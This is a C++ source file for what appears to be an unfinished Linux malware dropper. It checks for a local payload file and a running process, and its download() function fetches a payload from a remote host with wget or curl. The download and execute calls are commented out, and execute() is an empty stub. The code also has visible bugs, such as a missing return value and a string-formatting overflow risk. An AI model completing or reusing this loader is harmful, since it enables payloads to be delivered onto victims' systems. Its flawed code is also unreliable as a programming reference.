#include "dropper.h"

int pull()
{
	fprintf(stdout, "[Dropper called]");

	bool payloadExists = fileExists(_PayloadLocal);

	//fputs(payloadExists ? "Exists" : "Doesn't Exist", stdout);

	//if(!payloadExists)
	//  	download();

	payloadRunning();
	//fputs(payloadRunning() ? "\nIs running" : "\nIsn't running", stdout);

	//execute();

	return 0;
}

//NOTE Only checks for accessibility, not existance.
bool fileExists(std::string name)
{
	struct stat buffer;
	return (stat (name.c_str(), &buffer) == 0);
}

bool payloadRunning()
{
	char command[32];
	
	sprintf(command, "pgrep %s > /dev/null", _ProcName);

	pid_t pid = fork();
	if(pid == 0)
	{
		system(command);
		exit(1);
	}

	std::cout << "\nPID: " << command << std::endl;

	//return(0 == system(command));

/*	pid_t pid = fork();

	if(pid == 0)
	{
		errno = execl("/usr/bin/killall", "killall", "-0", _ProcName.c_str(), NULL);
		exit(errno);

	}

	std::cout << "ERRNO: " << errno << std::endl;
	return(errno == 0);*/
}

void download()
{
	std::vector<const char*> webclients = 
	{
			"/usr/bin/wget",
		   	"/usr/bin/curl"
	};


	for(size_t i = 0; i < webclients.size(); i++)
	{
		if(fileExists(webclients[i]))
		{
				std::cout << "Found webclient: " << webclients[i] << std::endl;
				
				int pid = fork();

				if(pid == 0)
					execl(webclients[i], "wget", 
										 (i == 0) ? "-q" : "-sS",
										 (i == 0) ? "-O" : "-o",
										 _PayloadLocal.c_str(), 
										 _PayloadRemote.c_str(),
										 NULL);

				break;
		}
	}
}

void execute()
{

}
